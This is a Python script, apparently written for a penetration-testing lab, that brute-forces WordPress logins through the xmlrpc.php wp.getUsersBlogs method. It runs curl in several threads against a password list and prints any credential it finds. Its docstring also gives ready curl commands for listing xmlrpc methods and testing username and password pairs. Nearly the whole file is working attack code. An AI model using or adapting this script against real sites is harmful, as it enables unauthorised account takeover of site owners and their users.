import os
import sys
import time
import subprocess

import argparse
from collections import ChainMap

import concurrent.futures


"""
Some bicycle for bruteforse by curl in you tired of hydra, burp, zap and etc...
Works bad with threads more than 10. Requires script restart then.

Check usernames and passes:
curl -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>admin</value></param></params></methodCall>" -X POST http://10.11.1.234/xmlrpc.php

Check methods:
curl -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>admin</value></param></params></methodCall>" -X POST http://10.11.1.234/xmlrpc.php

curl -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" -X POST http://10.11.1.234/xmlrpc.php

"""
defaults = {'url': 'http://10.11.1.234/xmlrpc.php','login': 'admin', 'passfile': '/usr/share/seclists/Passwords/darkweb2017-top100.txt', 'threads': 10, 'delay': 0.5}

parser = argparse.ArgumentParser(description='Script for POST curl bruteforce. Example: python3 xmlrpc_brute.py -u http://10.11.1.234/xmlrpc.php -t 15 -d 0.5 -l admin -p /usr/share/seclists/Passwords/darkweb2017-top100.txt')
parser.add_argument('-u', '--url', help='Target url')
parser.add_argument('-l', '--login', help='Login to bruteforce')
parser.add_argument('-p', '--passfile', help='File with passwords')
parser.add_argument('-t', '--threads', help='Number of threads')
parser.add_argument('-d', '--delay', help='Delay between requests')

args = parser.parse_args()
new_dict = {key: value for key, value in vars(args).items() if value}
settings = ChainMap(new_dict, defaults)

pass_lst = []

# Read file with paswords and generate list
with open(settings['passfile']) as fp:
	for line in fp:
		if len(line) > 0:
			pass_lst.append(line.strip())


def curl_req(login, pos, password):
	url = settings['url']
	payload = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' + login + '</value></param><param><value>' + password + '</value></param></params></methodCall>'
	res = subprocess.check_output(['curl', '-d', payload, '-X', 'POST', url], stderr=subprocess.STDOUT)
	res = res.decode()

	time.sleep(float(settings['delay']))		# Need better way for delay between requests

	# Check result
	if '<value><string>Incorrect' not in res.split():
		return True, pos, password
	else:
		return False, pos, password


def brute_th(login, password_list, threads):
	pass_lst_len = len(password_list)
	n = 0

	while n < pass_lst_len:
		with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
			future_lst = [executor.submit(curl_req, settings["login"], i, password) for i, password in enumerate(password_list[n:n+threads])]
			
			for result in concurrent.futures.as_completed(future_lst):
				#print(result.result())
				checker, pos, password = result.result()

				if checker:
					print('##########################################')
					print('Found password!')
					print(f'{settings["login"]}:{password}')
					print('##########################################')
					
					return True
				
				sys.stdout.write(f'Progress: {password}\r')
				sys.stdout.flush()
				
				n += 1


def main():
	start_time = time.time()

	brute_th(settings['login'], pass_lst, int(settings['threads']))

	print(f'Required time: {(time.time() - start_time):.1f} sec')

if __name__ == '__main__':
	main()

"""
# # Our progress-bar
# sys.stdout.write(f'Progress: {i + 1}/{pass_lst_len}\r')
# sys.stdout.flush()
# print('##########################################')
# print('Found password!')
# print(f'{settings["login"]}:{password}')
# print(f'Row: {i + 1}/{pass_lst_len}')
# print('##########################################')
# sys.stdout.write('\b')
# sys.stdout.flush()
"""
